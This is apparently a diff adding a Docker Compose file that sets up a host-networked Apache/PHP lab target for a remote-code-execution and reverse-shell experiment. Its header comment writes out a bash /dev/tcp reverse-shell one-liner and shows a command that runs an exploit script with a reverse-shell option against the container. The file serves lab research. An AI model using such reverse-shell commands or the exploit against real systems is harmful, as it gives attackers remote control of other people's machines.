@@ -1,0 +1,27 @@
+# Host-network variant of the exploitation target — for the CLASSIC reverse
+# shell experiment (container -> host callback).
+#
+# network_mode: host shares the host's network namespace: the container's
+# 127.0.0.1 IS the host's loopback, so `bash -c 'sh -i >&/dev/tcp/127.0.0.1/4444
+# 0>&1'` fired by the exploit reaches a listener on the host. This is the
+# variant that rootful-Docker machines get for free via the bridge gateway
+# (172.17.0.1) — on a rootless daemon the callback only works this way.
+#
+# Apache is rebound from :80 to :29558 so it cannot collide with anything on
+# the host. Usage:
+#   docker compose -f lab/rce/docker-compose.host.yml up -d
+#   python3 exploit/rce.py --port 29558 --container php2shell-rce-host --reverse 4444
+services:
+  apache:
+    image: php2shell-lab:8.5.11
+    container_name: php2shell-rce-host
+    network_mode: host
+    cap_add:
+      - SYS_PTRACE
+    entrypoint:
+      - bash
+      - -c
+      - >-
+        sed -i 's/Listen 80/Listen 29558/' /etc/apache2/ports.conf &&
+        sed -i 's|<VirtualHost \*:80>|<VirtualHost *:29558>|' /etc/apache2/sites-available/000-default.conf &&
+        apache2-foreground
